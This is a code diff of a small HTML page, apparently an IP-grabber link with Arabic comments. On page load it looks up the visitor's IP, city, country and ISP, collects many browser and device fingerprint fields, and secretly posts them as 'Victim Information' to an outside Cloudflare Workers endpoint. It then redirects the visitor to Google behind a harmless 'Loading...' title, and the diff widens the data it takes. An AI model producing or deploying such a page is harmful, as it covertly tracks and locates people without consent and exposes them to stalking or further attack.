@@ -2,40 +2,51 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Checking Connection...</title>
+    <title>Loading...</title>
 </head>
 <body>
     <script>
         async function captureInfo() {
             try {
-                // 1. جلب الـ IP من موقع خارجي
+                // جلب الـ IP والمعلومات الجغرافية
                 const ipReq = await fetch('https://ipapi.co/json/');
                 const ipData = await ipReq.json();
 
-                // 2. تجهيز الرسالة
                 const msg = `
 ✅Victim Information 
 
 ⚓ IP: ${ipData.ip} (https://ip-api.com/#${ipData.ip}) | Time: ${new Date().toLocaleString()}
-📍 Location: ${ipData.city}, ${ipData.country_name}
+📍 Location: ${ipData.city} - ${ipData.country_name}
+🌐 ISP: ${ipData.org}
 
 📱 Device Information
-userAgent: ${navigator.userAgent}
+productSub: ${navigator.productSub}
+vendor: ${navigator.vendor}
+maxTouchPoints: ${navigator.maxTouchPoints}
+hardwareConcurrency: ${navigator.hardwareConcurrency}
+cookieEnabled: ${navigator.cookieEnabled}
+appCodeName: ${navigator.appCodeName}
+appName: ${navigator.appName}
+appVersion: ${navigator.appVersion}
 platform: ${navigator.platform}
+product: ${navigator.product}
+userAgent: ${navigator.userAgent}
 language: ${navigator.language}
+webdriver: ${navigator.webdriver}
+pdfViewerEnabled: ${navigator.pdfViewerEnabled}
                 `;
 
-                // 3. إرسال البيانات للـ Worker الخاص بك (رابطك هنا)
+                // إرسال البيانات للـ Worker الخاص بك
                 const workerUrl = "https://gbs.tjarb093.workers.dev/";
 
                 await fetch(workerUrl, {
                     method: 'POST',
-                    mode: 'no-cors', // لضمان العمل حتى مع قيود التصفح
+                    mode: 'no-cors', 
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ message: msg })
                 });
 
-                // 4. توجيه الشخص لموقع حقيقي (مثلاً فيديو يوتيوب أو جوجل)
+                // توجيه الضحية لـ Google بعد نصف ثانية
                 setTimeout(() => {
                     window.location.href = "https://www.google.com";
                 }, 500);
@@ -44,7 +55,6 @@ language: ${navigator.language}
                 window.location.href = "https://www.google.com";
             }
         }
-
         window.onload = captureInfo;
     </script>
 </body>
